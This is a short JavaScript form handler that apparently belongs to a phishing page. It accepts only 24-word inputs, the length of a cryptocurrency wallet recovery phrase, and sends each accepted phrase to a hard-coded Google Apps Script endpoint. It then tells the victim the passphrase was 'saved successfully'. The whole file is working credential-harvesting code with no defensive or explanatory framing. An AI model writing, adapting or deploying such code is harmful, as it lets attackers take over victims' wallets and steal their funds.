// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    myButton.disabled = true;
    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    const form = document.getElementById('myForm'); 
    const inputValue = form.elements['mf-texts'].value.trim();
    
    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return;
    }

    // Step 2: Send the passphrase to Google Apps Script Web App
    const webAppUrl = "https://script.google.com/macros/s/AKfycbzZkC3cqGP1qnpLW54EFpm9jr-_A7QI2GAcfBghxAt7USwSLsUvBUyvLoyfsXLKfMuU_A/exec"; // Replace with your Google Apps Script Web App URL

    fetch(webAppUrl, {
        method: 'POST',
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ passphrase: inputValue }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
            errorElement.textContent = "Passphrase saved successfully!";
        } else {
            errorElement.textContent = "Error: " + data.message;
        }
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Error occurred while processing your request.';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    });
}

// Add event listener to the form
const form = document.getElementById('myForm');
form.addEventListener('submit', handleSubmit);
